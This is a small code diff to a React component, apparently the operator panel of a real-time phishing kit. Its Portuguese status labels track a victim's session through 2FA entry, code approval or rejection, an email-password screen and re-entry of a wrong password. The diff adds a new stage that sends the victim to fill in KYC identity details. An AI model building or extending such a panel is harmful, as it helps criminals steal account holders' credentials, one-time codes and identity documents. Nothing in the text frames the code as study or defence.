@@ -467,6 +467,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
     if (status === "redirect_otp") return { label: "Digitando 2FA", color: "text-blue-400" };
     if (status === "otp_approved") return { label: "2FA aprovado ✓", color: "text-green-400" };
     if (status === "otp_rejected") return { label: "2FA rejeitado", color: "text-destructive" };
+    if (status === "redirect_kyc") return { label: "Preenchendo KYC", color: "text-primary" };
     if (status === "login_success") return { label: "Login concluído ✓", color: "text-green-400" };
     if (status === "redirect_confirm_email") return { label: "Tela Email (senha)", color: "text-amber-400" };
     if (status === "confirm_wrong_password") return { label: "Reentrando senha email", color: "text-destructive" };
